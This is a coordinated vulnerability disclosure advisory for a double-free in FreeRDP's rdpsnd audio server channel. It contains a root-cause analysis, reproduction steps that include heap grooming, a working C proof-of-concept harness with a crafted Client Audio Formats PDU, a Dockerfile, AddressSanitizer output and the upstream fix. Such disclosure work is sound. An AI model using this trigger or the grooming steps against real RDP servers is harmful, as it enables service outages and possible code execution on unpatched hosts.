<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-ZPF40VKS -->

# ANT-2026-ZPF40VKS · freerdp/freerdp

## double-free high

[CVE-2026-63652](https://nvd.nist.gov/vuln/detail/CVE-2026-63652)
[GHSA-9g22-w2gr-vcmp](https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-9g22-w2gr-vcmp)

Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.

# ANT-2026-ZPF40VKS: Audio server double-free of client format list

In rdpsnd\_server\_recv\_formats(), the server allocates context->client\_formats and then parses each client audio format; if a format's cbSize exceeds remaining stream bytes, Stream\_SafeSeek() fails and control jumps to out\_free, which frees context->client\_formats but leaves the pointer and num\_client\_formats intact. The dangling pointer persists through rdpsnd\_server\_stop()/reset, and when the session is torn down rdpsnd\_server\_context\_free() (line ~1143) unconditionally frees it a second time. In the shadow server, rdpsnd->rdpcontext is never assigned so setChannelError is skipped and the main client loop keeps servicing other virtual channels after the first free, giving an authenticated attacker a grooming window to reclaim the chunk before triggering the second free on disconnect. The result is at minimum a reliable remote DoS (glibc double-free abort) and, with heap grooming, a heap-corruption primitive that may lead to code execution in the server.

**Project:** freerdp/freerdp
**Location:** `channels/rdpsnd/server/rdpsnd_main.c:263`

The out\_free label at rdpsnd\_main.c:263 calls free(context->client\_formats) without setting the pointer to NULL or clearing num\_client\_formats; nothing else on the error/stop/reset path clears it either. Because rdpsnd\_server\_context\_free() at line ~1143 unconditionally calls free(context->client\_formats) during teardown (reached from shadow\_client.c:2932, sfreerdp.c:105, mf\_peer.c:231, wf\_peer.c:84), the same pointer is freed twice. The attacker controls both the size of the allocation (via wNumberOfFormats) and the timing between the two frees (via disconnect), enabling allocator-metadata corruption.

1. Authenticate to the FreeRDP shadow/proxy/sample server and join the RDPSND channel
2. In response to the server's SNDC\_FORMATS, send a Client Audio Formats PDU where one format's cbSize (e.g. 0xFFFF) exceeds remaining stream bytes
3. Stream\_SafeSeek() fails; out\_free frees context->client\_formats (size wNumberOfFormats \* sizeof(AUDIO\_FORMAT)) without NULLing it
4. Send crafted PDUs on another virtual channel sized to reclaim the freed chunk with attacker-controlled data
5. Disconnect; session teardown calls rdpsnd\_server\_context\_free(), which frees the reclaimed chunk a second time

## Suggested Fix

On the out\_free error path, set context->client\_formats = NULL and context->num\_client\_formats = 0 immediately after freeing so that later cleanup cannot free the pointer again.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-ZPF40VKS.

---

**Reference:** ANT-2026-ZPF40VKS

Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.

## Summary

The FreeRDP audio-output **server** channel (`rdpsnd`, server side) parses the
client-advertised audio-format list in `rdpsnd_server_recv_formats()`
(`channels/rdpsnd/server/rdpsnd_main.c`). It allocates `context->client_formats`
up front and then validates each format record. On **any** per-record validation
failure the function jumps to the `out_free:` label, which calls
`free(context->client_formats)` **without clearing `context->client_formats`**
(and without resetting `context->num_client_formats`). The dangling pointer
survives channel stop/reset, and at session teardown
`rdpsnd_server_context_free()` unconditionally calls
`free(context->client_formats)` a **second time** — an attacker-influenced
double-free (CWE-415).

An authenticated remote RDP client triggers this with a single crafted PDU over
the standard static `rdpsnd` virtual channel: no server-side user interaction,
and audio redirection is a default-expected RDP feature present in FreeRDP-based
servers (shadow server, proxy, `sfreerdp`). The attacker controls the freed
chunk's size (`wNumberOfFormats`) and the timing of the second free (via
disconnect), so beyond a guaranteed remote DoS this is a size-controlled
double-free / heap-corruption primitive.

## Affected versions

* **FreeRDP 3.x** — present in released tags **3.22.0, 3.26.0, 3.27.1** and on
  **`master`** (HEAD `1f7a716d39b5605bb8a83b0c3c97a6ce386609ef`, reproduced
  2026-07-01). Unpatched. On master the first free is at
  `channels/rdpsnd/server/rdpsnd_main.c:304` (`out_free`) and the second at
  `:1194` (`rdpsnd_server_context_free`); in 3.27.1 the same two frees are at
  `:275` and `:1155`. Because the bug is in released 3.x tags (not
  development-branch-only), it qualifies for a CVE per the project's
  supported-versions policy.
* Requires the server build to include the `rdpsnd` server channel (standard).

## Details

### Vulnerable code

`channels/rdpsnd/server/rdpsnd_main.c`, `rdpsnd_server_recv_formats()`:

```
context->client_formats = audio_formats_new(context->num_client_formats);   // :217 calloc(N, sizeof(AUDIO_FORMAT))
...
for (UINT16 i = 0; i < context->num_client_formats; i++)
    AUDIO_FORMAT* format = &context->client_formats[i];

    if (!Stream_CheckAndLogRequiredLength(TAG, s, 18))
        goto out_free;                                                      // (a) short record

    Stream_Read_UINT16(s, format->wFormatTag);
    Stream_Read_UINT16(s, format->nChannels);
    ...
    Stream_Read_UINT16(s, format->nBlockAlign);
    ...
    Stream_Read_UINT16(s, format->cbSize);

    if ((format->nChannels == 0) || (format->nBlockAlign == 0))
        goto out_free;                                                      // (b) zero divisor

    ... /* ADPCM nBlockAlign sanity checks */ ...

    if (format->cbSize > 0)
        if (!Stream_SafeSeek(s, format->cbSize))                            // :287
            WLog_ERR(TAG, "Stream_SafeSeek failed!");
            goto out_free;                                                  // (c) cbSize > remaining
...
out_free:                                                                   // :303
    free(context->client_formats);                                         // :304  frees, but pointer NOT cleared
    return error;
```

`audio_formats_new(count)` is `calloc(count, sizeof(AUDIO_FORMAT))` — one heap
block — so `context->client_formats` points at a single allocation.

At teardown, `rdpsnd_server_context_free()` frees the same field again:

```
// channels/rdpsnd/server/rdpsnd_main.c — rdpsnd_server_context_free() (:1175)
    free(context->server_formats);
    free(context->client_formats);   // :1194  SECOND free of the dangling pointer
    free(context->priv);
    free(context);
```

The overflow trigger used by the PoC is the `cbSize` path (c): a format record
declaring `cbSize = 0xFFFF` with no trailing bytes makes
`Stream_SafeSeek(s, 0xFFFF)` fail, so the first (already-parsed) record sends
control to `out_free` after the array is allocated. Paths (a) and (b) reach the
same free.

### Root cause

The error path frees a buffer still owned by `context->client_formats` without
nulling the owning field, breaking the single-owner invariant that
`rdpsnd_server_context_free()` relies on.

### Server-independent call path (from the channel dispatcher)

```
rdpsnd_server_thread                                     rdpsnd_main.c:308
  rdpsnd_server_handle_messages                          rdpsnd_main.c:1221
    (read priv->msgType)                                 rdpsnd_main.c:1256
    switch (priv->msgType)                               rdpsnd_main.c:1281
      case SNDC_FORMATS:                                 rdpsnd_main.c:1291
        rdpsnd_server_recv_formats(context, s)           rdpsnd_main.c:1292
          free(context->client_formats)                  rdpsnd_main.c:304    <-- FIRST free (out_free)
  ...session teardown...
  rdpsnd_server_context_free(context)                    rdpsnd_main.c:1175
    free(context->client_formats)                        rdpsnd_main.c:1194   <-- SECOND free
```

`SNDC_FORMATS` is dispatched to `rdpsnd_server_recv_formats` unconditionally for
that message type, so any authenticated client that has joined the `rdpsnd`
static channel reaches the vulnerable function.

## Impact

A single malformed *Client Audio Formats* PDU frees a server heap chunk whose
size the attacker selects (via `wNumberOfFormats`); the same pointer is freed a
second time at session teardown. The immediately demonstrated, reliable impact
is a **remote denial of service** — modern glibc detects the double `free()` and
`abort()`s the server process (ASan reproduces it deterministically below).
Because the attacker controls the allocation size and the second-free timing,
and can drive arbitrary additional channel traffic between the two frees to
recycle the chunk, this is a genuine heap-corruption primitive; escalation to
code execution is opportunistic and allocator-hardening-dependent, and is not
demonstrated here. No server-side user interaction; requires a completed RDP
handshake (post-auth) → **High**.

## Proof of Concept

Self-contained Docker reproducer. It builds `libfreerdp` + `winpr` + the
`rdpsnd` server channel under AddressSanitizer at the affected commit, and a
small consumer that `#include`s the **real upstream translation unit**
(`channels/rdpsnd/server/rdpsnd_main.c`) so the frames carry the true upstream
source paths. It drives the genuine static `rdpsnd_server_recv_formats()` with a
crafted Client Audio Formats PDU body (exactly the bytes the dispatcher hands to
that function after stripping the SNDPROLOG), then calls the exported
`rdpsnd_server_context_free()` — i.e. the identical first-free / second-free pair
an authenticated client drives over the `rdpsnd` channel followed by session
teardown. (Standing up a full TLS/NLA RDP session plus a custom client that
emits the malformed PDU reaches the same two frames; the dispatcher wiring above
establishes that reachability.)

**`harness.c`**

```
/*
 * FreeRDP rdpsnd server double-free of client_formats (CWE-415).
 * Drives the real static rdpsnd_server_recv_formats() (hits out_free ->
 * free(client_formats) without NULLing) then the exported
 * rdpsnd_server_context_free() (second free) => double free.
 */
#include "rdpsnd_main.c"   /* the real upstream TU: static recv_formats + context_free */

#include <stdio.h>
#include <string.h>

static void w16(BYTE* p, UINT16 v) { p[0] = (BYTE)(v & 0xff); p[1] = (BYTE)((v >> 8) & 0xff); }
static void w32(BYTE* p, UINT32 v) { p[0] = (BYTE)v; p[1] = (BYTE)(v >> 8); p[2] = (BYTE)(v >> 16); p[3] = (BYTE)(v >> 24); }

int main(void)
    /* A Client Audio Formats PDU body (bytes after the 4-byte SNDPROLOG the
     * dispatcher has already stripped before calling recv_formats). */
    BYTE buf[38];
    memset(buf, 0, sizeof(buf));

    /* --- 20-byte fixed header --- */
    w32(buf + 0,  0);        /* dwFlags            */
    w32(buf + 4,  0);        /* dwVolume           */
    w32(buf + 8,  0);        /* dwPitch            */
    w16(buf + 12, 0);        /* wDGramPort         */
    w16(buf + 14, 1);        /* wNumberOfFormats = 1 -> one AUDIO_FORMAT allocated */
    buf[16] = 0;             /* cLastBlockConfirmed */
    w16(buf + 17, 0);        /* wVersion           */
    buf[19] = 0;             /* bPad               */

    /* --- one 18-byte WAVEFORMATEX-ish record --- */
    w16(buf + 20, 1);        /* wFormatTag = WAVE_FORMAT_PCM */
    w16(buf + 22, 2);        /* nChannels   (non-zero, passes the div-by-zero gate) */
    w32(buf + 24, 44100);    /* nSamplesPerSec   */
    w32(buf + 28, 0);        /* nAvgBytesPerSec  */
    w16(buf + 32, 4);        /* nBlockAlign (non-zero) */
    w16(buf + 34, 16);       /* wBitsPerSample   */
    w16(buf + 36, 0xFFFF);   /* cbSize = 65535 -> exceeds remaining bytes (0) -> Stream_SafeSeek fails */

    RdpsndServerContext* context = (RdpsndServerContext*)calloc(1, sizeof(RdpsndServerContext));
    if (!context) { fprintf(stderr, "calloc context failed\n"); return 2; }

    wStream* s = Stream_New(buf, sizeof(buf));
    if (!s) { fprintf(stderr, "Stream_New failed\n"); return 2; }

    fprintf(stderr, "[harness] calling rdpsnd_server_recv_formats (will hit out_free)\n");
    UINT rc = rdpsnd_server_recv_formats(context, s);
    fprintf(stderr, "[harness] recv_formats returned 0x%08x; client_formats=%p (DANGLING, not NULLed)\n",
            rc, (void*)context->client_formats);

    Stream_Free(s, FALSE);

    fprintf(stderr, "[harness] calling rdpsnd_server_context_free (second free -> double-free)\n");
    rdpsnd_server_context_free(context);

    fprintf(stderr, "[harness] survived (NO double-free -- likely a fixed build)\n");
    return 0;
```

**`Dockerfile`**

```
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ARG TARGET_COMMIT=1f7a716d39b5605bb8a83b0c3c97a6ce386609ef
ARG CLANG_VERSION=20

RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git make cmake ninja-build pkg-config libc6-dev \
        zlib1g-dev libssl-dev \
        wget gnupg lsb-release software-properties-common \
    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \
    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
    && rm -rf /var/lib/apt/lists/*

ENV CC=clang-${CLANG_VERSION} CXX=clang++-${CLANG_VERSION}
ENV ASAN_FLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"

RUN git clone https://github.com/FreeRDP/FreeRDP /src/repo
WORKDIR /src/repo
RUN git checkout ${TARGET_COMMIT}

RUN cmake -G Ninja -S /src/repo -B /build \
        -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_COMPILER=clang-${CLANG_VERSION} \
        -DCMAKE_C_FLAGS="${ASAN_FLAGS}" \
        -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
        -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address" \
        -DCMAKE_INTERPROCEDURAL_OPTIMIZATION=OFF \
        -DBUILD_SHARED_LIBS=ON \
        -DWITH_SERVER=ON -DWITH_CLIENT=OFF -DWITH_SAMPLE=OFF \
        -DWITH_SHADOW=OFF -DWITH_PROXY=OFF -DWITH_CLIENT_SDL=OFF \
        -DWITH_X11=OFF -DWITH_WAYLAND=OFF -DWITH_PCSC=OFF \
        -DWITH_SWSCALE=OFF -DWITH_FFMPEG=OFF -DWITH_OPUS=OFF \
        -DWITH_FUSE=OFF -DWITH_CUPS=OFF -DWITH_KRB5=OFF \
        -DCHANNEL_URBDRC=OFF -DWITH_LIBUSB=OFF \
        -DWITH_MANPAGES=OFF -DWITH_GSSAPI=OFF \
        -DUSE_VERSION_FROM_GIT_TAG=OFF \
    && cmake --build /build --target rdpsnd-server freerdp-server freerdp winpr

COPY harness.c /tmp/harness.c
RUN set -e ; \
    FRDP_SERVER=$(find /build -name 'libfreerdp-server*.so' | head -1) ; \
    FRDP=$(find /build -name 'libfreerdp3.so' -o -name 'libfreerdp.so' | head -1) ; \
    WINPR=$(find /build -name 'libwinpr3.so' -o -name 'libwinpr.so' | head -1) ; \
    RPATHS=$(find /build -name 'lib*.so' -exec dirname {} \; | sort -u | sed 's/^/-Wl,-rpath,/' | tr '\n' ' ') ; \
    $CC $ASAN_FLAGS \
        -I/src/repo/channels/rdpsnd/server \
        -I/src/repo/channels/rdpsnd/common \
        -I/src/repo/include -I/build/include \
        -I/build/winpr/include -I/src/repo/winpr/include \
        -I/src/repo/libfreerdp \
        /tmp/harness.c $RPATHS "$FRDP_SERVER" "$FRDP" "$WINPR" \
        -o /tmp/poc_run -fsanitize=address \
    && echo BUILD_OK

ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-${CLANG_VERSION}/bin/llvm-symbolizer
CMD ["/bin/sh","-c","/tmp/poc_run 2>&1; echo EXIT=$?"]
```

Build and run:

```
docker build -t frdp-rdpsnd-df .
docker run --rm frdp-rdpsnd-df
```

**Observed output at master `1f7a716d` (AddressSanitizer):**

```
[harness] calling rdpsnd_server_recv_formats (will hit out_free)
[ERROR][com.freerdp.channels.rdpsnd.server] - [rdpsnd_server_recv_formats]: Stream_SafeSeek failed!
[harness] recv_formats returned 0x0000054f; client_formats=0x7b390ebe0040 (DANGLING, not NULLed)
[harness] calling rdpsnd_server_context_free (second free -> double-free)
=================================================================
==7==ERROR: AddressSanitizer: attempting double-free on 0x7b390ebe0040 in thread T0:
    #0 ... in free
    #1 ... in rdpsnd_server_context_free /src/repo/channels/rdpsnd/server/rdpsnd_main.c:1194:2
    #2 ... in main /tmp/harness.c:71:2

0x7b390ebe0040 is located 0 bytes inside of 32-byte region [0x7b390ebe0040,0x7b390ebe0060)
freed by thread T0 here:
    #0 ... in free
    #1 ... in rdpsnd_server_recv_formats /src/repo/channels/rdpsnd/server/rdpsnd_main.c:304:2   (out_free)

previously allocated by thread T0 here:
    #0 ... in calloc
    #1 ... in rdpsnd_server_recv_formats /src/repo/channels/rdpsnd/server/rdpsnd_main.c:217:28  (audio_formats_new)

SUMMARY: AddressSanitizer: double-free /src/repo/channels/rdpsnd/server/rdpsnd_main.c:1194:2 in rdpsnd_server_context_free
==7==ABORTING
EXIT=134
```

## Suggested fix

Clear the pointer (and the count) on the error path so the later
`free(context->client_formats)` in `rdpsnd_server_context_free()` becomes a
`free(NULL)` no-op:

```
 out_free:
    free(context->client_formats);
+   context->client_formats = NULL;
+   context->num_client_formats = 0;
    return error;
```

**Fix-verified:** with this change the same PoC prints `client_formats=(nil)` and
exits `0` with no ASan report. (Defense-in-depth: `rdpsnd_server_context_free()`
could also NULL the field after freeing, but the root fix belongs on the error
path.)

## References

* `channels/rdpsnd/server/rdpsnd_main.c` — `rdpsnd_server_recv_formats()`
  (alloc at :217; `out_free` `free(client_formats)` at :304),
  `rdpsnd_server_context_free()` (second free at :1194); dispatcher
  `rdpsnd_server_handle_messages()` (:1221, `case SNDC_FORMATS:` :1291).
* Distinct sibling fixes (FreeRDP 3.22.0, different functions):
  `audin_server_recv_formats` over-free; `rdpsnd_treat_wave` async use-after-free.
* CWE-415 (Double Free).

## Attribution

please credit **Claude** and **Ada Logics** — found by Anthropic using agents
to study the security of open-source projects, with Ada Logics validating and reporting.

## Disclosure

This report follows a 90-day coordinated disclosure timeline as per https://www.anthropic.com/coordinated-vulnerability-disclosure

```
diff --git a/channels/rdpsnd/server/rdpsnd_main.c b/channels/rdpsnd/server/rdpsnd_main.c
index 3d0052e828f2..9955932310f6 100644
--- a/channels/rdpsnd/server/rdpsnd_main.c
+++ b/channels/rdpsnd/server/rdpsnd_main.c
@@ -181,6 +181,14 @@ static UINT rdpsnd_server_recv_quality_mode(RdpsndServerContext* context, wStrea
 	return CHANNEL_RC_OK;

+static void rdpsnd_server_client_format_free(RdpsndServerContext* context)
+{
+	WINPR_ASSERT(context);
+	free(context->client_formats);
+	context->client_formats = nullptr;
+	context->num_client_formats = 0;
+}
+
 /**
  * Read Client Audio Formats and Version PDU (2.2.2.2)
  *
@@ -301,7 +309,7 @@ static UINT rdpsnd_server_recv_formats(RdpsndServerContext* context, wStream* s)

 	return CHANNEL_RC_OK;
 out_free:
-	free(context->client_formats);
+	rdpsnd_server_client_format_free(context);
 	return error;

@@ -1191,7 +1199,7 @@ void rdpsnd_server_context_free(RdpsndServerContext* context)

 	free(context->server_formats);
-	free(context->client_formats);
+	rdpsnd_server_client_format_free(context);
 	free(context->priv);
 	free(context);
```

<https://github.com/FreeRDP/FreeRDP/commit/caf653c0ba1c75ec8f298d1baa59770102a5d14c>

1. 2026-04-02
2. 2026-07-06
3. 2026-07-22
4. 2026-07-22
5. 2026-09-28

7d3085a90155c6cf9d8c963b5da4bf757e3f9c07044f326ccd172b54cd6e420d1808fe44d41917ddf06e8d1d03e33b1b174eb8afb9396c3dc416b4740ed194f8

Committed 2026-07-22 07:29 UTC

Revealed 2026-09-28 21:43 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-ZPF40VKS%22%2C%22bug_class%22%3A%22Double%20Free%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A39%2B00%3A00%22%2C%22description%22%3A%22In%20rdpsnd_server_recv_formats%28%29%2C%20the%20server%20allocates%20context-%3Eclient_formats%20and%20then%20parses%20each%20client%20audio%20format%3B%20if%20a%20format%27s%20cbSize%20exceeds%20remaining%20stream%20bytes%2C%20Stream_SafeSeek%28%29%20fails%20and%20control%20jumps%20to%20out_free%2C%20which%20frees%20context-%3Eclient_formats%20but%20leaves%20the%20pointer%20and%20num_client_formats%20intact.%20The%20dangling%20pointer%20persists%20through%20rdpsnd_server_stop%28%29/reset%2C%20and%20when%20the%20session%20is%20torn%20down%20rdpsnd_server_context_free%28%29%20%28line%20~1143%29%20unconditionally%20frees%20it%20a%20second%20time.%20In%20the%20shadow%20server%2C%20rdpsnd-%3Erdpcontext%20is%20never%20assigned%20so%20setChannelError%20is%20skipped%20and%20the%20main%20client%20loop%20keeps%20servicing%20other%20virtual%20channels%20after%20the%20first%20free%2C%20giving%20an%20authenticated%20attacker%20a%20grooming%20window%20to%20reclaim%20the%20chunk%20before%20triggering%20the%20second%20free%20on%20disconnect.%20The%20result%20is%20at%20minimum%20a%20reliable%20remote%20DoS%20%28glibc%20double-free%20abort%29%20and%2C%20with%20heap%20grooming%2C%20a%20heap-corruption%20primitive%20that%20may%20lead%20to%20code%20execution%20in%20the%20server.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22channels/rdpsnd/server/rdpsnd_main.c%3A263%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Authenticate%20to%20the%20FreeRDP%20shadow/proxy/sample%20server%20and%20join%20the%20RDPSND%20channel%22%2C%222.%20In%20response%20to%20the%20server%27s%20SNDC_FORMATS%2C%20send%20a%20Client%20Audio%20Formats%20PDU%20where%20one%20format%27s%20cbSize%20%28e.g.%200xFFFF%29%20exceeds%20remaining%20stream%20bytes%22%2C%223.%20Stream_SafeSeek%28%29%20fails%3B%20out_free%20frees%20context-%3Eclient_formats%20%28size%20wNumberOfFormats%20%2A%20sizeof%28AUDIO_FORMAT%29%29%20without%20NULLing%20it%22%2C%224.%20Send%20crafted%20PDUs%20on%20another%20virtual%20channel%20sized%20to%20reclaim%20the%20freed%20chunk%20with%20attacker-controlled%20data%22%2C%225.%20Disconnect%3B%20session%20teardown%20calls%20rdpsnd_server_context_free%28%29%2C%20which%20frees%20the%20reclaimed%20chunk%20a%20second%20time%22%5D%2C%22technical_details%22%3A%22The%20out_free%20label%20at%20rdpsnd_main.c%3A263%20calls%20free%28context-%3Eclient_formats%29%20without%20setting%20the%20pointer%20to%20NULL%20or%20clearing%20num_client_formats%3B%20nothing%20else%20on%20the%20error/stop/reset%20path%20clears%20it%20either.%20Because%20rdpsnd_server_context_free%28%29%20at%20line%20~1143%20unconditionally%20calls%20free%28context-%3Eclient_formats%29%20during%20teardown%20%28reached%20from%20shadow_client.c%3A2932%2C%20sfreerdp.c%3A105%2C%20mf_peer.c%3A231%2C%20wf_peer.c%3A84%29%2C%20the%20same%20pointer%20is%20freed%20twice.%20The%20attacker%20controls%20both%20the%20size%20of%20the%20allocation%20%28via%20wNumberOfFormats%29%20and%20the%20timing%20between%20the%20two%20frees%20%28via%20disconnect%29%2C%20enabling%20allocator-metadata%20corruption.%22%2C%22title%22%3A%22Audio%20server%20double-free%20of%20client%20format%20list%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-ZPF40VKS",
  "bug_class": "Double Free",
  "created_at": "2026-04-16T01:52:39+00:00",
  "description": "In rdpsnd_server_recv_formats(), the server allocates context->client_formats and then parses each client audio format; if a format's cbSize exceeds remaining stream bytes, Stream_SafeSeek() fails and control jumps to out_free, which frees context->client_formats but leaves the pointer and num_client_formats intact. The dangling pointer persists through rdpsnd_server_stop()/reset, and when the session is torn down rdpsnd_server_context_free() (line ~1143) unconditionally frees it a second time. In the shadow server, rdpsnd->rdpcontext is never assigned so setChannelError is skipped and the main client loop keeps servicing other virtual channels after the first free, giving an authenticated attacker a grooming window to reclaim the chunk before triggering the second free on disconnect. The result is at minimum a reliable remote DoS (glibc double-free abort) and, with heap grooming, a heap-corruption primitive that may lead to code execution in the server.",
  "discovered_at": "2026-04-02T00:00:00+00:00",
  "location": "channels/rdpsnd/server/rdpsnd_main.c:263",
  "project": "freerdp/freerdp",
    "1. Authenticate to the FreeRDP shadow/proxy/sample server and join the RDPSND channel",
    "2. In response to the server's SNDC_FORMATS, send a Client Audio Formats PDU where one format's cbSize (e.g. 0xFFFF) exceeds remaining stream bytes",
    "3. Stream_SafeSeek() fails; out_free frees context->client_formats (size wNumberOfFormats * sizeof(AUDIO_FORMAT)) without NULLing it",
    "4. Send crafted PDUs on another virtual channel sized to reclaim the freed chunk with attacker-controlled data",
    "5. Disconnect; session teardown calls rdpsnd_server_context_free(), which frees the reclaimed chunk a second time"
  "technical_details": "The out_free label at rdpsnd_main.c:263 calls free(context->client_formats) without setting the pointer to NULL or clearing num_client_formats; nothing else on the error/stop/reset path clears it either. Because rdpsnd_server_context_free() at line ~1143 unconditionally calls free(context->client_formats) during teardown (reached from shadow_client.c:2932, sfreerdp.c:105, mf_peer.c:231, wf_peer.c:84), the same pointer is freed twice. The attacker controls both the size of the allocation (via wNumberOfFormats) and the timing between the two frees (via disconnect), enabling allocator-metadata corruption.",
  "title": "Audio server double-free of client format list",
```
